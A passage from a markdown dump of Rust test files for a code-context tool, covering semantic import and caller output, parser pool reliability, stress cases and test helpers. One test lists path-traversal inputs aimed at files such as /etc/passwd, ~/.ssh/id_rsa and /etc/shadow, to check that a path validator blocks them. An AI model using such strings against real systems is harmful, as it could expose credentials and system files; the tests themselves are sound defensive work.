use lib::hello;

fn main() {
    hello();
}"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("lib.rs"),
        r#"pub fn hello() {
    println!("Hello");
}"#,
    )
    .unwrap();

    // Run with semantic analysis
    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--progress")
        .output()
        .expect("Failed to run context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // Verify semantic analysis ran
    assert!(stderr.contains("Analyzing semantic dependencies"));
    assert!(stderr.contains("Found") && stderr.contains("import"));

    // The bug: semantic information is not in the markdown
    println!("=== STDERR (progress output) ===");
    println!("{stderr}");
    println!("\n=== STDOUT (markdown output) ===");
    println!("{stdout}");

    // These assertions SHOULD pass but currently FAIL
    assert!(
        stdout.contains("main.rs")
            && (stdout.contains("imports: lib")
                || stdout.contains("Imports: lib")
                || stdout.contains("uses: lib::hello")
                || stdout.contains("Dependencies:")),
        "main.rs should show it imports lib module"
    );

    assert!(
        stdout.contains("lib.rs")
            && (stdout.contains("imported by: main.rs")
                || stdout.contains("Imported by: main.rs")
                || stdout.contains("Referenced by: main.rs")),
        "lib.rs should show it's imported by main.rs"
    );

    // TODO: This would require tracking function callers in the semantic analyzer
    // Currently we only track what functions a file calls, not who calls functions in a file
    // assert!(
    //     stdout.contains("hello()") &&
    //     (stdout.contains("called by: main") ||
    //      stdout.contains("Called by: main") ||
    //      stdout.contains("Callers: main")),
    //     "Function hello() should show it's called by main"
    // );
}
```

## tests/semantic_output_test.rs

Imports: std::fs, tempfile::TempDir

Type references: fs, tempfile::TempDir.TempDir

```rust
//! Integration test to verify semantic analysis data is included in markdown output

use std::fs;
use tempfile::TempDir;

/// Test that semantic analysis data (imports, callers, types) is included in the markdown output
#[test]
fn test_semantic_analysis_included_in_output() {
    // Create a temporary directory with test files
    let temp_dir = TempDir::new().unwrap();
    let base_path = temp_dir.path();

    // Create a simple project structure with imports
    let lib_dir = base_path.join("src");
    fs::create_dir_all(&lib_dir).unwrap();

    // Create main.rs that imports lib
    fs::write(
        lib_dir.join("main.rs"),
        r#"
use crate::lib::helper;
use crate::utils::format;

fn main() {
    helper::init();
    format::display("Hello");
}
"#,
    )
    .unwrap();

    // Create lib.rs with helper module
    fs::write(
        lib_dir.join("lib.rs"),
        r#"
pub mod helper;
pub mod utils;

use std::collections::HashMap;

pub fn process() {
    println!("Processing");
}
"#,
    )
    .unwrap();

    // Create helper.rs
    fs::write(
        lib_dir.join("helper.rs"),
        r#"
use std::fs;

pub fn init() {
    println!("Initialized");
}

pub fn cleanup() {
    println!("Cleanup");
}
"#,
    )
    .unwrap();

    // Create utils.rs
    fs::write(
        lib_dir.join("utils.rs"),
        r#"
pub mod format;

pub fn utility() {
    println!("Utility");
}
"#,
    )
    .unwrap();

    // Create format.rs
    fs::write(
        lib_dir.join("format.rs"),
        r#"
pub fn display(msg: &str) {
    println!("{}", msg);
}
"#,
    )
    .unwrap();

    // Run context-creator with semantic analysis flags
    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&lib_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // Print output for debugging
    eprintln!("STDOUT:\n{stdout}");
    eprintln!("STDERR:\n{stderr}");

    // Verify the command succeeded
    assert!(output.status.success(), "context-creator failed: {stderr}");

    // Check that semantic analysis was performed (from stderr progress messages)
    if stderr.contains("Analyzing semantic dependencies") {
        assert!(
            stderr.contains("Found") && stderr.contains("import relationships"),
            "Semantic analysis should report found imports"
        );
    }

    // Now check if the markdown output contains semantic information
    let markdown = stdout;

    // Test 1: Check if main.rs shows its imports
    assert!(
        markdown.contains("main.rs"),
        "Output should contain main.rs"
    );

    // Look for import information near main.rs
    let main_rs_section = markdown
        .split("## main.rs")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    // The output SHOULD include import information, but currently doesn't
    assert!(
        main_rs_section.contains("Imports:")
            || main_rs_section.contains("imports:")
            || main_rs_section.contains("Dependencies:")
            || main_rs_section.contains("lib::helper")
            || main_rs_section.contains("utils::format"),
        "main.rs section should show its imports (lib::helper, utils::format), but found:\n{main_rs_section}"
    );

    // Test 2: Check if helper.rs shows it's imported by main.rs
    let helper_section = markdown
        .split("## helper.rs")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    assert!(
        helper_section.contains("Imported by:")
            || helper_section.contains("imported by:")
            || helper_section.contains("Referenced by:")
            || helper_section.contains("main.rs"),
        "helper.rs section should show it's imported by main.rs, but found:\n{helper_section}"
    );

    // Test 3: Check if function calls are shown when --include-callers is used
    assert!(
        main_rs_section.contains("helper::init") ||
        main_rs_section.contains("format::display") ||
        main_rs_section.contains("Function calls:") ||
        main_rs_section.contains("Calls:"),
        "main.rs section should show function calls (helper::init, format::display), but found:\n{main_rs_section}"
    );

    // Test 4: Check if type references are shown when --include-types is used
    let lib_section = markdown
        .split("## lib.rs")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    assert!(
        lib_section.contains("HashMap")
            || lib_section.contains("Type references:")
            || lib_section.contains("Types used:"),
        "lib.rs section should show type references (HashMap), but found:\n{lib_section}"
    );
}

/// Test that semantic data is properly collected even if not displayed
#[test]
fn test_semantic_analysis_progress_messages() {
    // This test verifies that semantic analysis is actually running
    let temp_dir = TempDir::new().unwrap();
    let base_path = temp_dir.path();
    let src_dir = base_path.join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create files with clear import relationships
    fs::write(
        src_dir.join("main.rs"),
        r#"
mod utils;
use utils::helper;

fn main() {
    helper();
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("utils.rs"),
        r#"
pub fn helper() {
    println!("Helper function");
}
"#,
    )
    .unwrap();

    // Run with progress flag to see stderr messages
    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--progress")
        .output()
        .expect("Failed to execute context-creator");

    let stderr = String::from_utf8_lossy(&output.stderr);

    // Verify semantic analysis ran
    assert!(
        stderr.contains("Analyzing semantic dependencies"),
        "Should show semantic analysis progress"
    );

    assert!(
        stderr.contains("Found") && stderr.contains("import relationships"),
        "Should report number of import relationships found"
    );

    // The analysis found imports, but are they in the output?
    let stdout = String::from_utf8_lossy(&output.stdout);

    // This assertion will FAIL, proving the bug
    assert!(
        stdout.contains("utils")
            && (stdout.contains("Imports:")
                || stdout.contains("Dependencies:")
                || stdout.contains("imported by")),
        "The markdown output should contain semantic relationship information"
    );
}
```

## tests/semantic_reliability_test.rs

Imports: context_creator::core::semantic::parser_pool::ParserPoolManager, std::sync::Arc, tempfile::TempDir, tokio::runtime::Runtime, tokio, context_creator::core::semantic::AstCacheV2, std::path::Path, context_creator::core::semantic::path_validator::validate_import_path, std::fs

Type references: context_creator::core::semantic::parser_pool::ParserPoolManager.ParserPoolManager, tempfile::TempDir.TempDir, tokio::runtime::Runtime.Runtime, context_creator::core::semantic::AstCacheV2.AstCacheV2, std::path::Path.Path, validate_import_path, fs, tempfile::TempDir.TempDir, validate_import_path, fs

```rust
//! Reliability tests for semantic analysis
//! Tests thread safety, error handling, and resource management

use context_creator::core::semantic::parser_pool::ParserPoolManager;
use std::sync::Arc;
use tempfile::TempDir;
use tokio::runtime::Runtime;

// Note: Mutex error handling tests removed as AstCacheV2 uses async/await with moka cache
// which handles concurrent access differently and doesn't use mutexes

#[test]
fn test_parser_pool_creation() {
    let rt = Runtime::new().unwrap();

    rt.block_on(async {
        let pool_manager = ParserPoolManager::new();

        // Test getting parsers for different languages
        let rust_parser = pool_manager.get_parser("rust").await;
        assert!(rust_parser.is_ok());

        let js_parser = pool_manager.get_parser("javascript").await;
        assert!(js_parser.is_ok());

        // Test unsupported language
        let unknown_parser = pool_manager.get_parser("unknown_language").await;
        assert!(unknown_parser.is_err());
    });
}

#[test]
fn test_parser_pool_concurrent_access() {
    let rt = Runtime::new().unwrap();

    rt.block_on(async {
        let pool_manager = Arc::new(ParserPoolManager::new());
        let mut handles = vec![];

        // Spawn multiple tasks to access parsers concurrently
        for i in 0..20 {
            let pool_clone = pool_manager.clone();
            let handle = tokio::spawn(async move {
                let parser = pool_clone.get_parser("rust").await.unwrap();
                // Parser should have timeout set
                assert_eq!(parser.timeout_micros(), 5_000_000);

                // Simulate some work
                tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;

                // Parser is automatically returned to pool when dropped
                format!("Task {i} completed")
            });
            handles.push(handle);
        }

        // All tasks should complete successfully
        for handle in handles {
            let result = handle.await.unwrap();
            assert!(result.contains("completed"));
        }
    });
}

#[test]
fn test_parser_timeout_configuration() {
    let rt = Runtime::new().unwrap();

    rt.block_on(async {
        let pool_manager = ParserPoolManager::new();
        let parser = pool_manager.get_parser("python").await.unwrap();

        // Verify timeout is set to 5 seconds
        assert_eq!(parser.timeout_micros(), 5_000_000);
    });
}

#[test]
fn test_parsing_with_timeout() {
    use tokio::time::{timeout, Duration};

    let rt = Runtime::new().unwrap();

    rt.block_on(async {
        let pool_manager = ParserPoolManager::new();

        // Test normal parsing completes within timeout
        let normal_content = "fn main() { println!(\"Hello, world!\"); }";
        let result = timeout(Duration::from_secs(1), async {
            let mut parser = pool_manager.get_parser("rust").await.unwrap();
            parser.parse(normal_content, None)
        })
        .await;

        assert!(result.is_ok());
        assert!(result.unwrap().is_some());
    });
}

#[test]
fn test_cache_with_parser_pool() {
    use context_creator::core::semantic::AstCacheV2;
    use std::path::Path;

    let rt = Runtime::new().unwrap();

    rt.block_on(async {
        let cache = AstCacheV2::new(100);

        // Test parsing and caching
        let path = Path::new("test.rs");
        let content = "fn test() {}";

        let result = cache.get_or_parse(path, content, "rust").await;
        assert!(result.is_ok());

        // Second call should hit cache
        let result2 = cache.get_or_parse(path, content, "rust").await;
        assert!(result2.is_ok());
    });
}

#[test]
fn test_path_validation() {
    use context_creator::core::semantic::path_validator::validate_import_path;
    use std::fs;
    use tempfile::TempDir;

    let temp_dir = TempDir::new().unwrap();
    let base_dir = temp_dir.path();

    // Create test directory structure
    fs::create_dir_all(base_dir.join("src")).unwrap();
    fs::create_dir_all(base_dir.join("tests")).unwrap();
    fs::write(base_dir.join("src/lib.rs"), "").unwrap();
    fs::write(base_dir.join("tests/test.rs"), "").unwrap();

    // Valid paths within project
    assert!(validate_import_path(base_dir, &base_dir.join("src/lib.rs")).is_ok());
    assert!(validate_import_path(base_dir, &base_dir.join("tests/test.rs")).is_ok());

    // Invalid paths - outside project
    assert!(validate_import_path(base_dir, std::path::Path::new("/etc/passwd")).is_err());
    assert!(validate_import_path(base_dir, &base_dir.join("../../../etc/passwd")).is_err());

    // Invalid paths - absolute paths outside project
    assert!(validate_import_path(base_dir, std::path::Path::new("/tmp/file.rs")).is_err());

    // Edge case - symlinks should be resolved
    fs::write(base_dir.join("lib.rs"), "").unwrap();
    assert!(validate_import_path(base_dir, &base_dir.join("./src/../lib.rs")).is_ok());
}

#[test]
fn test_path_traversal_attack_prevention() {
    use context_creator::core::semantic::path_validator::validate_import_path;
    use std::fs;

    let temp_dir = TempDir::new().unwrap();
    let base_dir = temp_dir.path();

    // Create a src directory to make tests more realistic
    fs::create_dir_all(base_dir.join("src")).unwrap();

    // Various path traversal attempts
    let attacks = vec![
        "../../../etc/passwd",
        "../../.ssh/id_rsa",
        "../.env",
        "/etc/shadow",
        "\\..\\..\\windows\\system32\\config\\sam", // Windows style
        "src/../../../../../../etc/hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", // URL encoded
    ];

    for attack in attacks {
        let path = base_dir.join(attack);
        assert!(
            validate_import_path(base_dir, &path).is_err(),
            "Path traversal attack should be blocked: {attack}"
        );
    }
}
```

## tests/semantic_stress_test.rs

Imports: std::fs, tempfile::TempDir, std::os::unix::fs::symlink

Type references: fs, tempfile::TempDir.TempDir, symlink

```rust
//! Stress tests for semantic analysis - performance and scalability edge cases

use std::fs;
use tempfile::TempDir;

/// Test with a file that has hundreds of imports
#[test]
fn test_massive_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create many modules to import
    let module_count = 200;
    let mut modules = Vec::new();

    for i in 0..module_count {
        let module_name = format!("mod_{i:03}");
        modules.push(module_name.clone());

        fs::write(
            src_dir.join(format!("{module_name}.rs")),
            format!(
                r#"
pub fn function_{i}() -> i32 {{
    {i}
}}

pub const CONST_{i}: i32 = {i};

pub struct Type{i} {{
    value: i32,
}}
"#
            ),
        )
        .unwrap();
    }

    // Create main file that imports everything
    let mut main_content = String::new();

    // Add module declarations
    for module in &modules {
        main_content.push_str(&format!("mod {module};\n"));
    }

    // Add use statements
    main_content.push('\n');
    for module in &modules {
        main_content.push_str(&format!("use {module}::*;\n"));
    }

    // Add a main function that uses some imports
    main_content.push_str("\nfn main() {\n");
    main_content.push_str("    let sum = ");
    for i in 0..10 {
        if i > 0 {
            main_content.push_str(" + ");
        }
        main_content.push_str(&format!("function_{i}()"));
    }
    main_content.push_str(";\n    println!(\"Sum: {}\", sum);\n}\n");

    fs::write(src_dir.join("main.rs"), main_content).unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle massive number of imports
    assert!(output.status.success(), "Should handle 200+ imports");

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("main.rs"));
    assert!(stdout.contains("Imports:"));

    // Should list many modules
    assert!(stdout.contains("mod_000") && stdout.contains("mod_001"));
}

/// Test with deeply nested function calls
#[test]
fn test_deep_call_chain() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create a chain of functions calling each other
    let depth = 50;

    for i in 0..depth {
        let content = if i == depth - 1 {
            // Last function in chain
            format!(
                r#"
pub fn function_{i}(n: i32) -> i32 {{
    println!("Reached depth {i}");
    n + {i}
}}
"#
            )
        } else {
            // Function that calls the next one
            format!(
                r#"
mod level_{};
use level_{}::function_{};

pub fn function_{i}(n: i32) -> i32 {{
    function_{}(n + {i})
}}
"#,
                i + 1,
                i + 1,
                i + 1,
                i + 1
            )
        };

        fs::write(src_dir.join(format!("level_{i}.rs")), content).unwrap();
    }

    // Create entry point
    fs::write(
        src_dir.join("main.rs"),
        r#"
mod level_0;
use level_0::function_0;

fn main() {
    let result = function_0(0);
    println!("Final result: {}", result);
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle deep call chains
    assert!(
        output.status.success(),
        "Should handle 50-level deep call chain"
    );
}

/// Test with complex cross-module dependencies
#[test]
fn test_complex_cross_dependencies() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create a complex dependency graph
    // A -> B, C
    // B -> C, D
    // C -> D
    // D -> (none)
    // E -> A, B, C, D

    fs::write(
        src_dir.join("mod_a.rs"),
        r#"
use crate::mod_b::{func_b, TypeB};
use crate::mod_c::func_c;

pub fn func_a() {
    func_b();
    func_c();
}

pub struct TypeA {
    b: TypeB,
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("mod_b.rs"),
        r#"
use crate::mod_c::{func_c, TypeC};
use crate::mod_d::func_d;

pub fn func_b() {
    func_c();
    func_d();
}

pub struct TypeB {
    c: TypeC,
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("mod_c.rs"),
        r#"
use crate::mod_d::{func_d, TypeD};

pub fn func_c() {
    func_d();
}

pub struct TypeC {
    d: TypeD,
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("mod_d.rs"),
        r#"
pub fn func_d() {
    println!("Base function");
}

pub struct TypeD {
    value: i32,
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("mod_e.rs"),
        r#"
use crate::mod_a::{func_a, TypeA};
use crate::mod_b::{func_b, TypeB};
use crate::mod_c::{func_c, TypeC};
use crate::mod_d::{func_d, TypeD};

pub fn func_e() {
    func_a();
    func_b();
    func_c();
    func_d();
}

pub struct TypeE {
    a: TypeA,
    b: TypeB,
    c: TypeC,
    d: TypeD,
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("main.rs"),
        r#"
mod mod_a;
mod mod_b;
mod mod_c;
mod mod_d;
mod mod_e;

use mod_e::func_e;

fn main() {
    func_e();
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Should handle complex cross-dependencies
    assert!(output.status.success());

    // Verify main imports all modules
    assert!(stdout.contains("main.rs"));
    assert!(stdout.contains("Imports: mod_a, mod_b, mod_c, mod_d, mod_e"));

    // Verify modules show correct imported by relationships
    assert!(stdout.contains("mod_d.rs") && stdout.contains("Imported by: main.rs"));
}

/// Test with files containing thousands of functions
#[test]
fn test_many_functions_in_file() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create a file with many functions
    let mut content = String::new();
    let function_count = 1000;

    for i in 0..function_count {
        content.push_str(&format!(
            r#"
pub fn func_{i}(x: i32) -> i32 {{
    x + {i}
}}
"#
        ));
    }

    // Add a main function that calls some of them
    content.push_str("\nfn main() {\n");
    for i in 0..10 {
        content.push_str(&format!("    func_{i}({i});\n"));
    }
    content.push_str("}\n");

    fs::write(src_dir.join("many_functions.rs"), content).unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle files with many functions
    assert!(
        output.status.success(),
        "Should handle 1000 functions in a file"
    );
}

/// Test with rapid file creation/modification
#[test]
fn test_concurrent_file_access() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create initial files
    for i in 0..10 {
        fs::write(
            src_dir.join(format!("file_{i}.rs")),
            format!(
                r#"
pub fn function_{i}() {{
    println!("File {i}");
}}
"#
            ),
        )
        .unwrap();
    }

    // Run context-creator multiple times in parallel (simulated by quick succession)
    for _ in 0..3 {
        let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
            .arg(&src_dir)
            .arg("--trace-imports")
            .output()
            .expect("Failed to execute context-creator");

        assert!(output.status.success(), "Should handle concurrent access");
    }
}

/// Test with mixed language-like file extensions (that might confuse parser)
#[test]
fn test_mixed_extensions() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create Rust files with unusual names
    fs::write(
        src_dir.join("test.rs.bak"),
        r#"
// This is a backup file but might be processed
pub fn backup_function() {}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("main.rs"),
        r#"
// Normal Rust file
fn main() {
    println!("Main");
}
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("config.rs.template"),
        r#"
// Template file
pub const TEMPLATE: &str = "template";
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle mixed extensions gracefully
    assert!(output.status.success());

    let stdout = String::from_utf8_lossy(&output.stdout);
    // Should include the main.rs file
    assert!(stdout.contains("main.rs"));
}

/// Test with symlinks (if supported by OS)
#[test]
#[cfg(unix)]
fn test_symlink_handling() {
    use std::os::unix::fs::symlink;

    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    let lib_dir = temp_dir.path().join("lib");
    fs::create_dir_all(&src_dir).unwrap();
    fs::create_dir_all(&lib_dir).unwrap();

    // Create a file in lib
    fs::write(
        lib_dir.join("shared.rs"),
        r#"
pub fn shared_function() {
    println!("Shared function");
}
"#,
    )
    .unwrap();

    // Create a symlink in src pointing to lib file
    symlink(lib_dir.join("shared.rs"), src_dir.join("shared_link.rs")).unwrap();

    // Create a file that uses the symlinked module
    fs::write(
        src_dir.join("main.rs"),
        r#"
mod shared_link;
use shared_link::shared_function;

fn main() {
    shared_function();
}
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle symlinks
    assert!(output.status.success(), "Should handle symlinked files");
}

/// Test with extremely nested directory structure
#[test]
fn test_deep_directory_nesting() {
    let temp_dir = TempDir::new().unwrap();
    let mut current_dir = temp_dir.path().to_path_buf();

    // Create deeply nested structure
    let depth = 20;
    for i in 0..depth {
        current_dir = current_dir.join(format!("level_{i}"));
        fs::create_dir_all(&current_dir).unwrap();

        // Add a file at each level
        fs::write(
            current_dir.join("mod.rs"),
            format!(
                r#"
pub fn level_{i}_function() {{
    println!("At level {i}");
}}
"#
            ),
        )
        .unwrap();
    }

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(temp_dir.path())
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle deep directory nesting
    assert!(
        output.status.success(),
        "Should handle 20-level deep directories"
    );
}
```

## tests/semantic_test_helpers.rs

Imports: context_creator::cli::Config, context_creator::core::cache::FileCache, context_creator, std::fs, std, std::sync::Arc, tempfile::TempDir, config

Type references: context_creator::cli::Config.Config, context_creator::core::cache::FileCache.FileCache, fs, tempfile::TempDir.TempDir, TestProjectBuilder, tempfile::TempDir.TempDir, tempfile::TempDir.TempDir, std.PathBuf, TestProjectBuilder, Self, Self, Self, P, AsRef, AsRef, std.Path, P, P, Self, Self, tempfile::TempDir.TempDir, std.PathBuf, Default, TestProjectBuilder, Self, Self, std.Path, std.Path, context_creator.FileInfo, context_creator::cli::Config.Config, std.Path, std.Path, context_creator.FileInfo, context_creator.FileInfo, context_creator.FileInfo, context_creator.FileInfo, context_creator.FileInfo, context_creator.FileInfo, context_creator.FileInfo, context_creator.FileInfo, context_creator.FileInfo, tempfile::TempDir.TempDir, std.PathBuf, tempfile::TempDir.TempDir, std.PathBuf, tempfile::TempDir.TempDir, std.PathBuf, tempfile::TempDir.TempDir, std.PathBuf, tempfile::TempDir.TempDir, std.PathBuf, tempfile::TempDir.TempDir, std.PathBuf

```rust
//! Helper functions for semantic analysis tests

use context_creator::cli::Config;
use context_creator::core::cache::FileCache;
use context_creator::core::walker::{walk_directory, FileInfo, WalkOptions};
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tempfile::TempDir;

/// Test project builder for creating file structures
pub struct TestProjectBuilder {
    temp_dir: TempDir,
    files: Vec<(PathBuf, String)>,
}

impl TestProjectBuilder {
    /// Create a new test project builder
    pub fn new() -> Self {
        Self {
            temp_dir: TempDir::new().unwrap(),
            files: Vec::new(),
        }
    }

    /// Add a file to the test project
    pub fn add_file<P: AsRef<Path>>(mut self, path: P, content: &str) -> Self {
        self.files
            .push((path.as_ref().to_path_buf(), content.to_string()));
        self
    }

    /// Build the test project and return the root path
    pub fn build(self) -> (TempDir, PathBuf) {
        let root = self.temp_dir.path().to_path_buf();

        for (path, content) in self.files {
            let full_path = root.join(&path);
            if let Some(parent) = full_path.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(full_path, content).unwrap();
        }

        (self.temp_dir, root)
    }
}

impl Default for TestProjectBuilder {
    fn default() -> Self {
        Self::new()
    }
}

/// Analyze a test project with semantic analysis enabled
pub fn analyze_project_with_options(
    root: &Path,
    trace_imports: bool,
    include_callers: bool,
    include_types: bool,
    semantic_depth: usize,
) -> Vec<FileInfo> {
    let config = Config {
        paths: Some(vec![root.to_path_buf()]),
        trace_imports,
        include_callers,
        include_types,
        semantic_depth,
        ..Config::default()
    };

    let walk_options = WalkOptions::from_config(&config).unwrap();
    let cache = Arc::new(FileCache::new());

    let mut files = walk_directory(root, walk_options).unwrap();
    context_creator::core::walker::perform_semantic_analysis(&mut files, &config, &cache).unwrap();

    files
}

/// Analyze a test project with all semantic features enabled
pub fn analyze_test_project(root: &Path) -> Vec<FileInfo> {
    analyze_project_with_options(root, true, true, true, 3)
}

/// Find a file by its relative path in the results
pub fn find_file<'a>(files: &'a [FileInfo], path: &str) -> Option<&'a FileInfo> {
    files.iter().find(|f| {
        let path_str = f.relative_path.to_str().unwrap();
        // Handle both Unix and Windows path separators
        let normalized_path = path_str.replace('\\', "/");
        normalized_path == path || path_str == path
    })
}

/// Find a file by name (without caring about the directory)
#[allow(dead_code)]
pub fn find_file_by_name<'a>(files: &'a [FileInfo], name: &str) -> Option<&'a FileInfo> {
    files.iter().find(|f| {
        f.relative_path
            .file_name()
            .and_then(|n| n.to_str())
            .map(|n| n == name)
            .unwrap_or(false)
    })
}

/// Assert that a file has specific imports
pub fn assert_has_imports(file: &FileInfo, expected_imports: &[&str]) {
    for expected in expected_imports {
        let found = file.imports.iter().any(|import| {
            import
                .file_name()
                .and_then(|n| n.to_str())
                .map(|n| n == *expected)
                .unwrap_or(false)
        });
        assert!(
            found,
            "Expected import '{}' not found in {:?}. Actual imports: {:?}",
            expected,
            file.relative_path,
            file.imports
                .iter()
                .filter_map(|p| p.file_name())
                .filter_map(|n| n.to_str())
                .collect::<Vec<_>>()
        );
    }
}

/// Assert that a file is imported by specific files
pub fn assert_imported_by(file: &FileInfo, expected_importers: &[&str]) {
    for expected in expected_importers {
        let found = file.imported_by.iter().any(|importer| {
            importer
                .file_name()
                .and_then(|n| n.to_str())
                .map(|n| n == *expected)
                .unwrap_or(false)
        });
        assert!(
            found,
            "Expected to be imported by '{}' but wasn't. Actual importers: {:?}",
            expected,
            file.imported_by
                .iter()
                .filter_map(|p| p.file_name())
                .filter_map(|n| n.to_str())
                .collect::<Vec<_>>()
        );
    }
}

/// Create a simple Rust project for testing
pub fn create_rust_test_project() -> (TempDir, PathBuf) {
    TestProjectBuilder::new()
        .add_file(
            "main.rs",
            r#"
mod lib;
mod utils;

use crate::utils::helper;

fn main() {
    lib::greet("World");
    helper();
    let user = lib::User::new("Alice");
    println!("{}", user.name);
}
"#,
        )
        .add_file(
            "lib.rs",
            r#"
pub struct User {
    pub name: String,
}

impl User {
    pub fn new(name: &str) -> Self {
        User { name: name.to_string() }
    }
}

pub fn greet(name: &str) {
    println!("Hello, {}!", name);
}
"#,
        )
        .add_file(
            "utils.rs",
            r#"
pub fn helper() {
    println!("Helper function");
}

pub fn unused() {
    println!("This function is not called");
}
"#,
        )
        .build()
}

/// Create a Python test project
#[allow(dead_code)]
pub fn create_python_test_project() -> (TempDir, PathBuf) {
    TestProjectBuilder::new()
        .add_file(
            "main.py",
            r#"
import os
from lib import greet, User
from utils import helper

def main():
    greet("World")
    helper()
    user = User("Alice")
    print(user.name)

if __name__ == "__main__":
    main()
"#,
        )
        .add_file(
            "lib.py",
            r#"
class User:
    def __init__(self, name):
        self.name = name

def greet(name):
    print(f"Hello, {name}!")
"#,
        )
        .add_file(
            "utils.py",
            r#"
def helper():
    print("Helper function")

def unused():
    print("This function is not called")
"#,
        )
        .build()
}

/// Create a JavaScript test project
#[allow(dead_code)]
pub fn create_javascript_test_project() -> (TempDir, PathBuf) {
    TestProjectBuilder::new()
        .add_file(
            "main.js",
            r#"
import { greet, User } from './lib.js';
import { helper } from './utils.js';

function main() {
    greet("World");
    helper();
    const user = new User("Alice");
    console.log(user.name);
}

main();
"#,
        )
        .add_file(
            "lib.js",
            r#"
export class User {
    constructor(name) {
        this.name = name;
    }
}

export function greet(name) {
    console.log(`Hello, ${name}!`);
}
"#,
        )
        .add_file(
            "utils.js",
            r#"
export function helper() {
    console.log("Helper function");
}

export function unused() {
    console.log("This function is not called");
}
"#,
        )
        .build()
}

/// Create a TypeScript test project
pub fn create_typescript_test_project() -> (TempDir, PathBuf) {
    TestProjectBuilder::new()
        .add_file(
            "main.ts",
            r#"
import { greet, User } from './lib';
import { helper } from './utils';
import type { Config } from './types';

const config: Config = {
    debug: true,
    name: "test"
};

function main(): void {
    greet("World");
    helper();
    const user = new User("Alice");
    console.log(user.name);
}

main();
"#,
        )
        .add_file(
            "lib.ts",
            r#"
export class User {
    constructor(public name: string) {}
}

export function greet(name: string): void {
    console.log(`Hello, ${name}!`);
}
"#,
        )
        .add_file(
            "utils.ts",
            r#"
export function helper(): void {
    console.log("Helper function");
}

export function unused(): void {
    console.log("This function is not called");
}
"#,
        )
        .add_file(
            "types.ts",
            r#"
export interface Config {
    debug: boolean;
    name: string;
}

export type Status = 'active' | 'inactive';
"#,
        )
        .build()
}

/// Create a project with circular dependencies
pub fn create_circular_deps_project() -> (TempDir, PathBuf) {
    TestProjectBuilder::new()
        .add_file(
            "a.rs",
            r#"
mod b;
use crate::b::func_b;

pub fn func_a() {
    println!("In func_a");
    func_b();
}
"#,
        )
        .add_file(
            "b.rs",
            r#"
mod c;
use crate::c::func_c;

pub fn func_b() {
    println!("In func_b");
    func_c();
}
"#,
        )
